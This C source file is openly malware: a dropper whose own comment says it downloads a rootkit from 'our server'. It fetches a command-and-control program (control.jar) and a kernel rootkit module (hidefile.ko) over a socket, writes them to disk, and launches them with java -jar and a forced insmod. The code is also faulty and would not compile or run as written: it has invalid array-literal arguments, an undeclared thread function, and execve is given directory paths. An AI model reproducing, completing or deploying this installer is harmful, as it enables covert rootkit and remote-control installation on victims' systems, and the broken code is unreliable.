#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <errno.h>
#include <pthread.h>


#define BUFFER_SIZE 4096
#define SP_PORT     8890
#define SERVER_ADDR "127.0.0.1"
char* ROOTKIT = "hidefile.ko";   
char* CCPROGRAM = "control.jar";  

static int readbuf(int conn, char* buf, int size);
static int getIntFromBuf(char* buf, int offset);
static int insmod(char* modName);
static int execcmd(char** args);
static int obtain(char* filename);

/**
 * @brief This installer.c is a installer that download the rootkit from our server
 * @return 
 */
int main()
{
    int rv;
    
    rv = obtain(CCPROGRAM);
    if(rv == 0) execcmd({"/usr/bin", "java", "-jar", CCPROGRAM, NULL});
    
    rv = obtain(ROOTKIT);
    if(rv == 0) execcmd({"/sbin", "insmod", "-f", ROOTKIT, NULL});
    
    printf("Install success!\n");
    return 0;
}

static int obtain(char* filename){
    int sock_cli = socket(AF_INET,SOCK_STREAM, 0);
    struct sockaddr_in servaddr;
    char buf[BUFFER_SIZE];
    int filesize, chunk;
    FILE *fp;    

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SP_PORT); 
    servaddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);  
    
    if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("Connect failure!\n");
        exit(1);
    }
                    
    memcpy(buf, "obtain\n", 7);                     // Req for obtain a rootkit/C&C program
    send(sock_cli, buf, strlen(buf),0); 
    
    memcpy(buf, filename, strlen(filename));
    memcpy(buf + strlen(filename), "\n", 1);
    send(sock_cli, buf, strlen(buf),0); 
    
    memset(buf, 0, sizeof(buf));    
    readbuf(sock_cli, buf, 4);                      // Read file size
    filesize = getIntFromBuf(buf, 0);
    if(filesize == 0)  return -1;
    
    memset(buf, 0, sizeof(buf));
    fp=fopen(filename,"w+");                         // Obtain file with buffer
    while(filesize > 0){
        if(filesize > BUFFER_SIZE){
            readbuf(sock_cli, buf, BUFFER_SIZE);
            fwrite(buf, BUFFER_SIZE, 1, fp);
            filesize -= BUFFER_SIZE;
        } else {
            readbuf(sock_cli, buf, filesize);
            fwrite(buf, filesize, 1, fp);
            break;
        }
    }
    
    fclose(fp);
    close(sock_cli);
    return 0;
}

static int readbuf(int conn, char* buf, int size){
    int cur = 0;
    while(cur < size){
        int cnt = recv(conn, buf + cur, size - cur, 0);
        if(cnt > 0){
            cur += cnt;
        } 
    }
    return cur;
}

static int getIntFromBuf(char* buf, int offset){
    int value;    
    value = (int) ( ((buf[offset] & 0xFF)<<24)  
            |((buf[offset+1] & 0xFF)<<16)  
            |((buf[offset+2] & 0xFF)<<8)  
            |(buf[offset+3] & 0xFF));  
    return value;
}

static int execcmd(char** args){
    pthread_t tid;
    pthread_attr_t attr;
    int rv;
    
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    rv=pthread_create(&tid, &attr, (void*)threadexec, args);
    
    return rv;
}

static void threadexec(char** av){
//    char *av[ ]={"/sbin", "insmod", "-f", modName};   
    char *ep[ ]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};   
    return execve(av[0], av, ep); 
}